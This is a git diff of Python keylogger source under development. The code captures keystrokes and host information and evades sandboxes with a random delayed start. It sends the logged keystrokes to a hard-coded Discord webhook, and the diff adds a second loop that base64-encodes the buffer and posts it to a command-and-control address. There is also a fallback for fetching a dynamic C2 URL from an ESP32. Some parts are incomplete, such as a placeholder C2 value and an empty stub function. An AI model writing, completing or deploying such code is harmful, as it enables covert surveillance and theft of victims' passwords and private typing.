@@ -13,6 +13,8 @@ current_time = datetime.datetime.now()
 username = os.path.expanduser('~')
 file_path = "sys32.txt"  # Not used anymore, preserved
 discord = "https://discord.com/api/webhooks/1405520151142600726/pdA3Whgfdlt0HycRmvjK4Uih36uNChuknDFN8C3RqZRFsi_T-UnVY9BL6tTIXAv2tu26"
+cnc_link = "192"
+
 esp_page = ""  # Optional fallback C2 redirect
 current_word = ""
 buffer = []
@@ -30,7 +32,6 @@ def evade_sandbox():
         exit()
     time.sleep(random.randint(15, 60))  # Delayed start
 
-# === PHASE 2: Dynamic Webhook via ESP32 ===
 def get_dynamic_url():
     if not esp_page:
         return None
@@ -42,22 +43,14 @@ def get_dynamic_url():
     except:
         return None
 
-# === PHASE 3: AES + reverse + base64 encoder ===
-"""
-def encrypt_buffer(data, key=b'supersecretkey'):
-    key = sha256(key).digest()
-    cipher = AES.new(key, AES.MODE_ECB)
-    encrypted = cipher.encrypt(pad(data.encode(), 16))
-    return base64.b64encode(encrypted[::-1]).decode()
-"""
-
+def  file_browers():
+    pass
 #Going to try base64 encoded datainsted 
 def hhhhh(data):
     encode_ASCII = data.encode("ascii")
     encode_base64 = base64.b64encode(encode_ASCII)
     return encode_base64.decode()    
 
-# === ORIGINAL KEYLOGGER CORE ===
 def on_press(key):
     global current_word
     try:
@@ -83,8 +76,7 @@ def write_word(word, how):
     entry = f"Word completed with {how}: {word}"
     buffer.append(entry)
 
-# === EXFIL FUNCTION: Uses Discord with AES encryption ===
-def send_buffer(url):
+def send_buffer_dis(url):
     if not buffer:
         return
     raw_text = "\n".join(buffer)
@@ -101,6 +93,17 @@ def send_buffer(url):
     except Exception as e:
         print("Send failed:", e)  # for debug only
 
+def send_buffer_2c(url):
+    if not buffer:
+        return
+    raw_text = "\n".join(buffer)
+    encrypted_payload =hhhhh(raw_text)
+    data = {"Content": encrypted_payload}
+    try:
+        r = requests.post(url, json=data)
+        print("Server replied:", r.status_code)
+    except Exception as e:
+        print("Send Failed:", e)
 
 def  sys_info():
     compturename = socket.gethostname()
@@ -109,9 +112,15 @@ def  sys_info():
     #homename = platform.node( )
 
 # === BACKGROUND EXFIL THREAD ===
-def sender_loop(url):
+def sender_loop_dis(url):
     while True:
-        send_buffer(url)
+        send_buffer_dis(url)
+        delay = random.randint(10, 60)
+        time.sleep(delay)
+        
+def sender_loop_2c(url):
+    while True:
+        send_buffer_2c(url)
         delay = random.randint(10, 60)
         time.sleep(delay)
 
@@ -129,6 +138,7 @@ if __name__ == "__main__":
     if dynamic_url:
         discord = dynamic_url
     sys_info()
-    threading.Thread(target=sender_loop, args=(discord,), daemon=True).start()
+    threading.Thread(target=sender_loop_dis, args=(discord,), daemon=True).start()
+    threading.Thread(target=sender_loop_2c, args=(cnc_link,), daemon=True).start()
     buffer.append(f"Session Started at: {current_time}")
     start()
